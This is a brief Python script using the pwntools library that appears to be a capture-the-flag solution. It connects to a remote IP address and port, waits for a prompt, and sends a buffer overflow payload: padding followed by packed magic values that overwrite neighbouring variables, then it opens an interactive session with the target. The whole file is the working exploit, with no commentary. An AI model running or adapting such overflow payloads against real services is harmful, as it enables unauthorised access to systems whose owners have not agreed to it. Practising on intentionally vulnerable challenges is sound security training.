from pwn import *
r = remote('140.110.112.192','2111')
r. recvuntil('What do you want to tell me:')
r.sendline('a'*12+p32(0xfaceb00c)+p32(0xdeadbeef) + p32(1))
r.interactive()
